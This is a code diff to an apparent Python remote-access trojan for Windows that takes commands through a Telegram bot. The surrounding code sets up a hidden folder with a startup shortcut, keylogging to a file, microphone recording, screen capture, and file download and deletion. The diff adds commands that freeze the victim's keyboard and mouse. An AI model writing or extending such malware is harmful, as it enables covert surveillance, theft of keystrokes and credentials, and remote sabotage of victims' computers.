@@ -40,13 +40,18 @@ if not os.path.exists(hide_folder):
 	shortcut.WorkingDirectory = hide_folder
 	shortcut.save()
 initi = False
+keyboardFrozen = False
+mouseFrozen = False
 user = os.environ.get("USERNAME")	# Windows username to append keylogs.txt
 log_file = hide_folder + '\\keylogs.txt'
+hookManager = pyHook.HookManager()
 # functionalities dictionary: command:arguments
 functionalities = { '/capture_pc' : '', \
 					'/cd':'<target_dir>', \
 					'/delete':'<target_file>', \
 					'/download':'<target_file>', \
+					'/freeze_keyboard':'', \
+					'/freeze_mouse':'', \
 					'/hear':'[time in seconds, default=5s]', \
 					'/ip_info':'', \
 					'/keylogs':'', \
@@ -77,7 +82,7 @@ def pressed_chars(event):
 			print tofile
 		else:
 			stdout.write(tofile)
-	return True
+	return not keyboardFrozen
 	
 def handle(msg):
 	chat_id = msg['chat']['id']
@@ -132,6 +137,25 @@ def handle(msg):
 							response = 'Found in hide_folder: ' + hide_folder
 						except:
 							response = 'Could not find ' + path_file
+			elif command.endswith('freeze_keyboard'):
+				global keyboardFrozen
+				keyboardFrozen = not command.startswith('/un')
+				hookManager.KeyAll = lambda event: not keyboardFrozen
+				response = 'Keyboard is now '
+				if keyboardFrozen:
+					response += 'disabled. To enable, use /unfreeze_keyboard'
+				else:
+					response += 'enabled'
+			elif command.endswith('freeze_mouse'):
+				global mouseFrozen
+				mouseFrozen = not command.startswith('/un')
+				hookManager.MouseAll = lambda event: not mouseFrozen
+				hookManager.HookMouse()
+				response = 'Mouse is now '
+				if mouseFrozen:
+					response += 'disabled. To enable, use /unfreeze_mouse'
+				else:
+					response += 'enabled'
 			elif command.startswith('/hear'):
 				SECONDS = -1
 				try:
@@ -298,7 +322,6 @@ if len(known_ids) > 0:
 	for known_id in known_ids:
 		bot.sendMessage(known_id, helloWorld)
 print 'Listening for commands on ' + platform.uname()[1] + '...'
-proc = pyHook.HookManager()
-proc.KeyDown = pressed_chars
-proc.HookKeyboard()
+hookManager.KeyDown = pressed_chars
+hookManager.HookKeyboard()
 pythoncom.PumpMessages()
